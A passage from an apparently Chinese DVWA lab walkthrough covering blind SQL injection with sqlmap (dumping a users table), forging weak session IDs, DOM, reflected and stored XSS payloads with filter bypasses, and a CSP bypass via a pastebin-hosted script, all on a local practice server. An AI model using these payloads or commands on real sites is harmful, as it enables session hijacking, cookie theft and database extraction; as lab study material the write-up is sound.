  --second-url="http://localhost/DVWA/vulnerabilities/sqli_blind/" \
  --batch \
  --dbs
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754378630634-eb7643e5-c720-4591-be8b-6589c1ad649d.png)

接下来操作都是差不多的，比如获取用户凭证

```plain
python2 sqlmap.py \
  -u "http://localhost/DVWA/vulnerabilities/sqli_blind/" \
  --data="id=1&Submit=Submit" \
  --cookie="id=1; security=high; PHPSESSID=8817313ac8f5f877050ea1b622643c59" \
  --second-url="http://localhost/DVWA/vulnerabilities/sqli_blind/" \
  --batch \
  --dump -D dvwa -T users
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754379056150-2603773c-84fa-49bd-bcc5-a3b0c3a7a296.png)

不一一展示了

## 九、弱会话IDs（Weak Session IDs）
这个我做的时候，Cookie里老是没有dvwaSeesion这个参数，布吉岛为什么

### 前言
Weak Session IDs（弱会话标识符）是指会话标识符设计或生成的方式存在安全漏洞，使能够预测、或伪造有效的会话标识符，从而未授权地访问用户会话。这类严重威胁网络应用的安全性，可能导致用户数据泄露、账户和其他恶意活动。以下是对 Weak Session IDs 的详细介绍，包括其原理、常见手法、产生原因、防御措施以及实例分析。

一、Weak Session IDs 的原理

会话标识符（Session ID）是用于在客户端和服务器之间维持会话状态的唯一标识符。它通常存储在 Cookie 中，附加在 URL 上，或作为隐藏表单字段传递。Weak Session IDs 的产生源于以下几种常见情况：

1. 可预测的生成算法：使用简单或可预测的算法生成 Session ID。

2. 过短的标识符长度：标识符长度不足，增加了被的风险。

3. 缺乏随机性：使用时间戳、递增序列或其他缺乏随机性的值生成标识符。

4. 重复使用旧的会话标识符：会话标识符在用户重新登录或会话超时后未及时更新。

二、常见手法

1. 会话固定（Session Fixation）

• 诱使受害者使用特定的会话标识符，并在受害者登录后利用该标识符访问其账户。

2. 会话劫持（Session Hijacking）

• 通过各种手段（如中间人、XSS、网络嗅探等）窃取有效的会话标识符，以冒充受害者身份访问系统。

3. 会话预测（Session Prediction）

• 通过分析会话标识符的生成规律，预测和伪造有效的会话标识符。

三、产生原因

1. 不安全的生成算法

• 使用简单的算法，如线性递增、时间戳等生成会话标识符。

2. 缺乏加密和随机性

• 生成标识符时未使用安全的随机数生成器。

3. 配置不当

• 服务器配置不当导致会话标识符未及时更新或无效标识符未正确处理。

4. 开发实践不足

• 缺乏对安全会话管理的理解和实践，未采用最佳安全实践。

四、防御措施

1. 使用安全的会话标识符生成算法

• 采用安全的随机数生成器（如 SecureRandom）生成足够长和随机的会话标识符。

2. 加密和签名

• 对会话标识符进行加密和签名，防止篡改和伪造。

3. 定期更新会话标识符

• 用户登录、权限提升或会话超时时更新会话标识符，防止旧标识符被利用。

4. 使用 HTTPS

• 强制使用 HTTPS 加密通信，防止会话标识符在传输过程中被窃取。

5. 设置合适的 Cookie 属性

• 使用 HttpOnly 和 Secure 属性保护存储会话标识符的 Cookie，防止通过客户端脚本访问和在不安全的连接上传输。

6. 会话管理和过期

• 设置合理的会话过期时间和自动失效机制，及时清理无效会话。

### 难度low
审计代码

```plain
<?php

$html = "";

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    if (!isset ($_SESSION['last_session_id'])) {
        $_SESSION['last_session_id'] = 0;
    }
//服务器每次生成的session_id加1给客户端
    $_SESSION['last_session_id']++;
    $cookie_value = $_SESSION['last_session_id'];
    setcookie("dvwaSession", $cookie_value);
}
?>
```

burpsuite抓包

Cookie: dvwaSession=6; PHPSESSID=8817313ac8f5f877050ea1b622643c59;

每次点击页面上的Generate后抓包这个dvwaSession都会加1，和源码是对应的

删完浏览器cookie后访问 [http://localhost/DVWA/vulnerabilities/weak_id/](http://localhost/DVWA/vulnerabilities/weak_id/)，抓包修改cookie：

Cookie: dvwaSession=6; PHPSESSID=8817313ac8f5f877050ea1b622643c59;security= low  
（其实dvwaSession在这里+1弄成7或许会更好？）

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754380860347-8e2d12f5-7f67-4a5a-a360-52bf2b7fdf9b.png)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754380885016-56203054-69bb-4114-beb3-a850c57115cb.png)

进去了

### 难度medium
审计代码

```plain
<?php

$html = "";

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $cookie_value = time();
//返回当前时间的 Unix 时间戳，并格式化为日期：
time() 函数返回自 Unix 纪元（January 1 1970 00:00:00 GMT）起的当前时间的秒数
    setcookie("dvwaSession", $cookie_value);
}
?>
```

通过时间戳来生成的session，可以通过时间戳转换工具生成时间戳：[https://tool.lu/timestamp/](https://tool.lu/timestamp/)

和难度low一样的操作，抓包

Cookie: dvwaSession=1754381313; PHPSESSID=157159deea4c47ff180f048c12765be4; security=medium

清空浏览器cookie后操作

（其实dvwaSession在这里用当前时间重新生成一个或许会更好？）

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754381449219-ac83ce35-f0be-45cb-9031-926e6cb6f4ab.png)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754381469178-98dd5678-443c-495e-b2ba-2feca05f9179.png)

进来了

### 难度high
审计代码

```plain
<?php

$html = "";

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    if (!isset ($_SESSION['last_session_id_high'])) {
        $_SESSION['last_session_id_high'] = 0;
    }
    $_SESSION['last_session_id_high']++;
    $cookie_value = md5($_SESSION['last_session_id_high']);
//setcookie(name,value,expire,path,domain,secure,httponly)
 参数                  描述
name         必需。规定cookie的名称。
value         必需。规定cookie的值。
expire       可选。规定cookie的有效期。
path         可选。规定cookie的服务器路径。
domain         可选。规定cookie的域名。
secure         可选。规定是否通过安全的HTTPS连接来传输cookie。
httponly     可选。规定是否Cookie仅可通过HTTP协议访问。
    setcookie("dvwaSession", $cookie_value, time()+3600, "/vulnerabilities/weak_id/", $_SERVER['HTTP_HOST'], false, false);
}

?>
```

先抓个包看看，Cookie里没有dvwaSession，只有

Cookie: PHPSESSID=eb8194307928fd2eb7f01bbdafd3e50d; security=high

我直接F12浏览器里看吧，得到dvwaSession=6f4922f45568161a8cdf4ad2299f6d23，看起来像md5加密后的数字

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754445464558-e52652d1-4df0-4bc0-8f1c-2729961103ad.png)

那就清空浏览器Cookie后抓包，把值改成

Cookie: PHPSESSID=eb8194307928fd2eb7f01bbdafd3e50d; security=high;dvwaSession=1f0e3dad99908345f7439f8ffabdffc4

dvwaSession改成19的md5加密后的值1f0e3dad99908345f7439f8ffabdffc4（但是我试了下不改也进去了）

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754445665156-d5ed78ea-9785-4f52-a685-5aab9c554800.png)

进来了

## 十、DOM型XSS漏洞（DOM Based Cross Site Scripting (XSS)）
### 前言
跨站点脚本（XSS）攻击是一种注入攻击，恶意脚本会被注入到可信的网站中。当攻击者使用 web 应用程序将恶意代码（通常以浏览器端脚本的形式）发送给其他最终用户时，就会发生 XSS 攻击。允许这些攻击成功的漏洞很多，并且在 web 应用程序的任何地方都有可能发生，这些漏洞会在使用用户的输入，没有对其进行验证或编码。

攻击者可以使用 XSS 向不知情的用户发送恶意脚本，用户的浏览器并不知道脚本不应该被信任，并将执行 JavaScript。因为它认为脚本来自可信来源，所以恶意脚本可以访问浏览器并作用于该站点的任何 cookie、会话令牌或其他敏感信息，甚至可以重写 HTML 页面的内容。

基于 DOM 的 XSS 是一种特殊的反射型 XSS，通过将 JavaScript 隐藏在 URL 中。基于 DOM 的 XSS 将在页面呈现时被 JavaScript 拉出，而不是在服务时嵌入到页面中。这会使它比其他攻击更隐蔽，WAF 或其他保护读取页面正文时看不到任何恶意内容。

Run your own JavaScript in another user's browser, use this to steal the cookie of a logged in user.

在另一个用户的浏览器中运行你自己的 JavaScript，用它窃取登录用户的 cookie。

### 难度low
审计代码

```plain
<?php

# No protections, anything goes

?> 
```

服务器没有任何防御措施

接下来看前端的代码，该页面是个下拉页面，用于选择默认语言。F12 打开，点一点 HTML 标签看到如下 JS 代码。document 表示的是一个文档对象，Location 对象包含有关当前 URL 的信息，href 属性是一个可读可写的字符串，可设置或返回当前显示的文档的完整 URL。也就是说 “document.location.href” 的写法得到页面的 URL，而 indexOf() 方法可返回某个指定的字符串值在字符串中首次出现的位置，这里用来判断 “default=” 是否在 URL 中。substring(start,stop) 方法用于提取字符串中两个指定下标之间的字符，然后存到 lang 变量中，decodeURI() 函数可对 encodeURI() 函数编码过的 URI 进行解码。document.write 是 JavaScript 中对 document.open 所开启的文档流操作的 API 方法，它能够直接在文档流中写入字符串。

```plain
if (document.location.href.indexOf("default=") >= 0) {
    var lang = document.location.href.substring(document.location.href.indexOf("default=") + 8);
    document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
    document.write("<option value='' disabled='disabled'>----</option>");
}

document.write("<option value='English'>English</option>");
document.write("<option value='French'>French</option>");
document.write("<option value='Spanish'>Spanish</option>");
document.write("<option value='German'>German</option>");
```

选择下拉列表内容，选择的值会赋给 default 并添加到 url 的末尾，再将其传给 option 标签的 value 结点。也就是说可以注入一些 JS 代码进去，然后这部分会被包含到 lang 变量中，最终回显到页面上。

HTML DOM 有个 alert() 方法，用于显示带有一条指定消息和一个 OK 按钮的警告框。document.cookie 里面可以读到 cookie 信息，把 cookie 放在一个 alert() 生成的警告框中，回显时就会得到我们想要的信息了。注入的payload 如下所示：

```plain
<script>alert(document.cookie)</script>
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754448617984-67ae1e16-77d6-4546-923c-507310b336dd.png)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754449593438-3d03f3bd-ddc7-4a47-a643-f161620c3a68.png)

### 难度meduim
审计代码

前端代码不变，后端代码如下所示。array_key_exists() 函数检查某个数组中是否存在指定的键名，如果键名存在返回 true，键名不存在则返回 false。stripos(string,find,start) 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写），header() 函数向客户端发送原始的 HTTP 报头。也就是说现在服务器通过一个模式匹配，过滤了 “script” 标签，不能直接注入 JS 代码了。

```plain
<?php

// Is there any input?
if (array_key_exists("default", $_GET) && !is_null ($_GET[ 'default'])){
    $default = $_GET['default'];
    
    # Do not allow script tags
    if (stripos ($default, "<script") !== false){
        header ("location: ?default=English");
        exit;
    }
}

?> 
```

可以直接注入标签将 cookie 显示出来。HTML 的 < img > 标签定义 HTML 页面中的图像，该标签支持 onerror 事件，在装载文档或图像的过程中如果发生了错误就会触发。使用这些内容构造出 payload 如下，因为实际没有图片可供载入，因此会出错从而触发 onerror 事件输出 cookie。构造payload：

```plain
English</option></select><img src = 1 onerror = alert(document.cookie)>
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754450107362-0fb66681-6bfc-46c3-9dc5-5973399b7bce.png)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754450174663-3a5da480-71f5-4e3c-893f-9180933a9fdf.png)

### 难度high
审计代码

前端代码不变，后端代码如下所示。服务器设置了白名单，default 参数只接受 French，English，German 以及 Spanish 这几个单词。

```plain
<?php

// Is there any input?
if (array_key_exists("default", $_GET) && !is_null ($_GET['default'])){

    # White list the allowable languages
    switch ($_GET['default']){
        case "French":
        case "English":
        case "German":
        case "Spanish":
            # ok
            break;
        default:
            header ("location: ?default=English");
            exit;
    }
}

?> 
```

可以在注入的 payload 中加入注释符 “#”，注释后边的内容不会发送到服务端，但是会被前端代码所执行。构造payload：

```plain
English #<script>alert(document.cookie)</script>
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754450596708-e3006186-263e-4ab1-877c-be7e61b1c6eb.png)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754450642753-6dde33b1-4dde-452b-9424-cef6fda6cc1e.png)

## 十一、反射性XSS（Reflected Cross Site Scripting (XSS)）
### 前言
放射型 XSS（Reflected XSS） 是一种跨站脚本攻击（Cross-Site Scripting, XSS）类型，指攻击者将恶意脚本代码作为参数注入到用户的请求中，并通过服务器原样返回这些参数到网页中，导致脚本被立即执行。

特点：

非持久性：恶意代码不会被存储在服务器端数据库中。

依赖用户点击链接：攻击者需要引诱受害者访问一个包含恶意脚本的 URL。

脚本立即在用户浏览器中执行。

### 难度low
审计代码

```plain
<?php
 
// 关闭浏览器的 XSS 防护（IE/Edge 专属，其他浏览器基本无效），以方便演示漏洞
header ("X-XSS-Protection: 0");
 
// 判断是否存在 name 参数，且不为空
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
 
    // 将 name 参数直接输出到页面中，未经过任何转义或过滤 —— 存在反射型 XSS 漏洞
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}
 
?>
```

low级别的代码只是判断了name参数是否为空，如果不为空的话就直接打印出来，并没有对name参数做任何的过滤和检查，没用进行任何的对XSS攻击的防御措施，存在非常明显的XSS漏洞，用户输入什么都会被执行；

用alert进行弹窗测试验证是否存在XSS，输入<script>alert(1)</script>查看返回结果：

```plain
<script>alert(1)</script>
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754458165925-96a2b349-9566-479d-ba6a-49829499282b.png)

成功弹窗，说明存在XSS漏洞并且可利用

### 难度medium
审计代码

```plain
<?php
 
// 关闭浏览器的 XSS 自动防护（主要针对 IE），为了方便测试 XSS
header ("X-XSS-Protection: 0");
 
// 判断是否存在 name 参数，且不为空
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
 
    // 获取用户输入，同时尝试进行简单的过滤：删除字符串中的 <script>
    // 但是这种方式不彻底，比如 <ScRiPt> 或 <script > 不会被过滤
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );
 
    // 输出到页面中，仍然未使用 htmlspecialchars，因此可能存在 XSS 漏洞
    echo "<pre>Hello ${name}</pre>";
}
 
?>
```

开发者试图用 str_replace('<script>', '', $_GET['name']) 来过滤 <script> 标签，但这是一种不完整的防护方式。

攻击者可以轻松绕过，例如构造如下payload：

```plain
# 仍然有效
<scr<script>ipt>alert(1)</scr<script>ipt>
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754458661874-6478db1a-39c2-4221-980f-0abdf0d9ae63.png)

```plain
# 因大小写不同不会被过滤
<ScRiPt>alert(1)</ScRiPt>
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754458683229-9c2e70d1-65f4-4da2-af57-bd6743568b92.png)

```plain
# 因空格而绕过
<script >alert(1)</script >
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754458693036-a3df1491-4534-4b8a-a856-0061a5b684ef.png)

### 难度high
审计代码

```plain
<?php
 
// 关闭浏览器的 XSS 自动防护（主要对 IE 有效）
header ("X-XSS-Protection: 0");
 
// 判断是否存在 name 参数，且不为空
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
 
    // 对用户输入进行过滤：使用正则表达式去除包含 script 的标签
    // 匹配形式为 <(任意字符)s(任意字符)c(任意字符)r(任意字符)i(任意字符)p(任意字符)t>（不区分大小写）
    // 示例：<script>、<ScRipT> 等都能被匹配并移除
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
 
    // 将过滤后的内容直接输出到页面中（未进行 HTML 实体编码）
    echo "<pre>Hello ${name}</pre>";
}
 
?>
```

使用了复杂的正则去匹配 <script> 标签的各种变形，属于一种黑名单式过滤（靠移除危险关键词）；

但是这种过滤方式：

没有使用 htmlspecialchars() 来进行 HTML 实体编码，仍存在反射型 XSS 的可能。

仍然不能防止非 script 标签造成的 XSS，如：

```plain
<img src=x onerror=alert(1)>
或者
<img src=1 onerror=alert(1)>
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754459042554-494098cc-be89-407e-8a2f-036052d58aa4.png)

## 十二、存储型XSS（Stored Cross Site Scripting (XSS)）
### 前言
存储型XSS（Stored Cross-Site Scripting）是恶意脚本被持久化保存到服务器（如数据库、文件等），当其他用户访问包含该脚本的页面时自动执行。常见于留言板、评论系统等用户提交内容被展示的场景。相对于反射型XSS，存储型XSS与反射型XSS的主要区别如下所示。

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754459754277-66ab9f07-1933-4251-b0bb-037b136a2bd4.png)

### 难度low
审计代码

```plain
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
	// Get input
	$message = trim( $_POST[ 'mtxMessage' ] );
	$name    = trim( $_POST[ 'txtName' ] );
    //trim（去除首尾空白字符）

	// Sanitize message input
	$message = stripslashes( $message );
	$message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

	// Sanitize name input
	$name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

	// Update database
	$query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

	//mysql_close();
}

?>
//输入一个名字和一段文本，然后网页会把把输入的信息加入到数据库中，同时服务器也会将服务器的内容回显到网页上。
//没有经过适当的HTML实体编码（如使用htmlspecialchars），存在XSS风险。
```

前端代码对Name的长度有限制，在Message中输入payload

```plain
<script>alert(/XSS/)</script>
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754463787064-6dd48bd1-84e8-4453-a594-6b1ff15e8f07.png)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754462419640-2d7a941b-e792-43b3-bbbe-d5f5a4f6b26e.png)

进入Home标签页，再回到XSS（Stored）页面，仍然可以成功，证明存储型XSS攻击成功

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754463874014-fd668d67-8a40-443d-b89c-22961c050aa5.png)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754463856683-9adef7a0-bc9e-4ee4-bdf1-7c8a86178737.png)

（如果需要删除数据库中存在的XSS代码，进入dvwa数据库中guestbook表，选择性删除数据。）

```plain
mysql -uroot -proot
use dvwa;
select * from guestbook;
delete from guestbook where comment_id=1;
delete from guestbook where comment_id=2;
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754464026196-4a8963c1-3e01-4bbf-baa2-b819e62ba89b.png)把插进去的删删掉

### 难度medium
审计代码

```plain
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );
    //htmlspecialchars()函数将特殊字符（如<, >, &, ", '）转换为对应的HTML实体（如&lt;, &gt;, &amp;, &quot;, &#039;），确保即使用户输入包含HTML或JavaScript代码，这些代码也会被浏览器解析为纯文本显示，而不是被执行。

    // Sanitize name input
    $name = str_replace( '<script>', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
//message参数对所有XSS都进行了过滤，但name参数只使用str_replace函数进行过滤，没有过滤大小写和双写
```

可以在Name参数输入Payload，因为存在长度限制，抓包改参数

```plain
<SCRIPT>alert('xss')</SCRIPT>
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754465670896-85aa15ec-2c23-433d-9afd-888d0cdfc32d.png)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754465680192-1219ede7-8dcf-4a29-97cc-6dd2e42b0d93.png)

去home页再回来也还是有弹出的，成功力

### 3. 难度high
审计代码

```plain
<?php

if(isset($_POST['btnSign'])){
    // Get input
    $message = trim($_POST['mtxMessage']);
    $name    = trim($_POST['txtName']);

    // Sanitize message input
    $message = strip_tags(addslashes($message));
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars($message);

    // Sanitize name input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook (comment, name) VALUES ('$message', '$name');";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query) or die('<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>');

    //mysql_close();
}

?> 
```

preg_replace() 函数执行一个正则表达式的搜索和替换，“*” 代表一个或多个任意字符，“i” 代表不区分大小写。也就是说 name 参数 “< script >” 标签在这里被完全过滤了，但是可以通过其他的标签例如 img、body 等标签的事件或者iframe 等标签的 src 注入 JS 攻击脚本。

HTML 的 < img > 标签定义 HTML 页面中的图像，该标签支持 onerror 事件，在装载文档或图像的过程中如果发生了错误就会触发。使用这些内容构造出 payload 如下，因为我们没有图片可供载入，因此会出错从而触发 onerror 事件。以下payload都可以：

```plain
<img src = 1 onerror = alert('xss')>
```

抓包改参数

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754467688093-0540ccd0-5556-4e83-a15c-dd2d91edc750.png)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754467730854-0a9cee66-3942-4f90-9bad-8c8824e7fdac.png)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754467694316-dbdfe3f7-ad8c-454e-9f35-9b53f3942463.png)

```plain
<img src=x onerror=alert(/XSS/)>
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754467776141-0f5c0d86-4629-4081-887a-5b153aa99c57.png)

```plain
<svg onload=alert(/XSS/)>
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754467820842-0fe91eae-2b60-42cb-b787-fb43c1d95b81.png)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754467880885-04120cb2-13f6-4082-9fd2-bbeca2dc7dae.png)

完事了都删删掉

## 十三、CSP内容安全策略（Content Security Policy (CSP) Bypass）
### 前言
内容安全策略（Content Security Policy，CSP）是一种用于防止跨站脚本（XSS）和其他代码注入攻击的安全机制。通过设定 CSP 头，网站可以指定哪些资源可以加载和执行。然而，即使有 CSP，攻击者有时仍然能找到方法绕过这些策略进行攻击。以下是对 CSP 绕过（CSP Bypass）的详细介绍，包括其原理、常见技术、攻击手法、防御措施以及实例分析。

一、CSP 绕过原理

CSP 绕过的核心在于找到策略配置中的漏洞或利用其他技术手段，使恶意代码能够在受保护的网站上执行。常见的 CSP 绕过原因包括：

策略配置错误：策略过于宽松或存在配置错误。

浏览器实现漏洞：浏览器对 CSP 实现中的漏洞。

资源注入：利用不受 CSP 控制的资源进行攻击。

二、常见技术和攻击手法

策略配置错误

宽松的 default-src：允许来自不安全来源的资源加载。

过多的 unsafe-inline 和 unsafe-eval：允许内联脚本和字符串解析为代码。

不适当的资源域名白名单：包含潜在不安全的域名。

数据注入

JSONP：利用 JSONP 响应执行代码。

跨域资源：在宽松的 CSP 策略中，利用跨域资源进行代码执行。

混合内容

HTTP 和 HTTPS 混合：利用 HTTP 加载不受信任的脚本。

DOM XSS

DOM 操作漏洞：利用不安全的 DOM 操作，如 innerHTML， eval，等。

服务端漏洞

服务器端渲染注入：在服务器端生成内容时存在注入漏洞。

三、防御措施

严格的 CSP 配置

最小特权原则：只允许加载和执行必需的资源。

避免 unsafe-inline 和 unsafe-eval：尽可能避免使用这些指令。

详细指定资源来源：明确指定允许加载资源的来源，不使用通配符（*）。

输入验证和输出编码

验证和清理用户输入：防止恶意数据进入页面。

正确编码输出：确保输出数据不会被浏览器解析为代码。

监控和报告

CSP 报告机制：启用 CSP 报告，将策略违规行为发送到指定服务器以进行监控和修复。

安全开发实践

使用安全库和框架：选择安全的开发库和框架，避免直接操作 DOM。

安全审计：定期进行代码审计和安全测试，发现和修复潜在漏洞。

CSP 指令参考：

default-src 指令：default-src指令定义了获取诸如JavaScript、图片、CSS、字体、AJAX请求、框架、HTML5媒体等资源的默认策略。并不是所有的指令都回退到default-src。

script-src指令：定义有效的JavaScript源。

style-src指令：定义样式表或CSS的有效源。

img-src指令：定义有效的图像源。

connect-src指令：适用于XMLHttpRequest (AJAX)， WebSocket, fetch()， <a ping>或EventSource。如果不允许，浏览器会模拟一个400 HTTP状态码。

font-src指令：定义字体资源的有效来源(通过@font-face加载)。

object-src指令：定义有效的插件源，如<object>、<embed>或<applet>。

media-src指令：定义有效的音频和视频源，例如HTML5 <audio>， <video>元素。

frame-src指令：定义加载帧的有效源。在CSP Level 2中，frame-src被弃用，取而代之的是child-src指令。CSP Level 3有未弃用的frame-src，如果不存在，它将继续遵从child-src。

sandbox指令：为请求的资源启用沙盒，类似于iframe沙盒属性。沙盒应用同源策略，防止弹出窗口，插件和脚本执行被阻止。您可以将沙盒值保留为空以保留所有限制，

　　　　　　  或者添加以下标志:allow-forms allow-same-origin allow-scripts allow-popups, allow-modals, allow-orientation-lock, allow-pointer-lock, 

　　　　　　  allow-presentation, allow-popup -to-escape-sandbox和allow-top-navigation

report-uri指令：指示浏览器将策略失败的报告发送到此URI。还可以使用Content-Security-Policy-Report-Only作为HTTP头名称，指示浏览器只发送报告(不阻止任何内容)。

　　　　　　　　 该指令在CSP Level 3中已被弃用，取而代之的是报告指令。

child-src指令：为使用<frame>和<iframe>等元素加载的web工作者和嵌套浏览上下文定义有效的源。

form-action指令：定义可用作HTML <form>动作的有效源。

frame-ancestors指令：使用<frame> <iframe> <object> <embed> <applet>定义嵌入资源的有效源。将此指令设置为“none”应该大致相当于X-Frame-Options: DENY

plugin-types指令：为通过<object>和<embed>调用的插件定义有效的MIME类型。要加载<applet>，必须指定application/x-java-applet。

base-uri指令：定义一组允许的url，这些url可以在HTML基标记的src属性中使用。

report-to指令：定义由Report-To HTTP响应头定义的报告组名称。

worker-src指令：限制可以作为Worker、SharedWorker或ServiceWorker加载的url。

manifest-src指令：限制可以加载应用程序清单的url。

prefetch-src指令：定义请求预取和预呈现的有效来源，例如通过带有rel="prefetch"或rel="prerender"的link标签:

navigate-to指令：限制文档可以通过任何方式导航到的url。例如，当单击链接时，提交表单或窗口。调用Location。如果存在form-action，则在提交表单时忽略该指令。

upgrade-insecure-requests指令：自动转换url从http到https的链接，图像，javascript, css等。

block-all-mixed-content指令：阻止对非安全http url的请求。

### 难度low
审计代码

```plain
<?php

$headerCSP = "Content-Security-Policy: script-src 'self' https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;"; // allows js from self, pastebin.com, jquery and google analytics.

header($headerCSP);

# https://pastebin.com/raw/R570EE00

?>
<?php
if (isset ($_POST['include'])) {
$page[ 'body' ] .= "
    <script src='" . $_POST['include'] . "'></script>
";
}
$page[ 'body' ] .= '
<form name="csp" method="POST">
    <p>You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:</p>
    <input size="50" type="text" name="include" value="" id="include" />
    <input type="submit" value="Include" />
</form>
';
```

在header头中加了Content-Security-Policy检验请求来源。如以上列举了self、[https://pastebin.com](https://pastebin.com)、example.com、code.jquery.com [https://ssl.google-analytics.com](https://ssl.google-analytics.com)。只有来自以上这几个地址，才能生效。

以[https://pastebin.com](https://pastebin.com)为例

生成脚本

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754469697353-fee30c79-3910-4275-9221-3beae9d1059c.png)

下载脚本

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754469735211-d6206433-c55f-4e86-bc65-d83b52ed0242.png)

在下载列表中，复制js的地址，这里是[https://pastebin.com/dl/MYtgCSVX](https://pastebin.com/dl/MYtgCSVX)![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754470050535-53620bf7-7444-4d53-9130-4992cca29ba2.png)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754469905290-a45c96c6-7a97-44d3-a798-6b61ff7da4c9.png)

引入pastebin中的js文件地址：

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754470050535-53620bf7-7444-4d53-9130-4992cca29ba2.png)

成功获取Cookie信息

